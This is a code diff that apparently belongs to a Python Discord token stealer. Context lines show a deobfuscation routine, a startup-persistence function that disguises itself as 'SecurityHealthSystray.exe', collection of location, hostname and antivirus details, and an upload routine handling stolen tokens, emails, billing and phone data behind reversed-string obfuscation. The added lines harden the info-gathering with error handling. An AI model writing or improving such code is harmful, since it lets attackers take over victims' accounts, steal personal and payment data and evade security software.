@@ -315,6 +315,7 @@ def deobf(encrypted_text, key):
         decrypted_text.append(decrypted_char)
     return bytes(decrypted_text)
 
+
 def add_to_startup(new_path):
     faked = 'SecurityHealthSystray.exe'
     addrs = f"{sys.executable} {new_path}"
@@ -509,9 +510,18 @@ def globalInfo():
     region = data['region']
     city = data['city']
     postal = data['postal']
-    computer_name = socket.gethostname()
-    cores = os.cpu_count()
-    avss = avs()
+    try:
+        computer_name = socket.gethostname()
+    except:
+        computer_name = 'error'
+    try:
+        cores = os.cpu_count()
+    except:
+        cores = 'Error'
+    try:
+        avss = avs()
+    except:
+        avss = 'Error'
     system = os.name
     try:
         if system == 'Linux':
@@ -881,8 +891,13 @@ def uploadTokq(Tokq, path):
 
     
     if friends == '': friends = "No Rare Friends"
+    
     if not billing:
-        badge, phone, billing = "🔒", "🔒", "🔒"
+        billing = "🔒"
+    if not badge:
+        badge = "🔒"
+    if not phone: 
+        phone = "🔒"
     if nitro == '' and badge == '': nitro = " -"
     tok = 'nekoT'
     em = 'liamE'
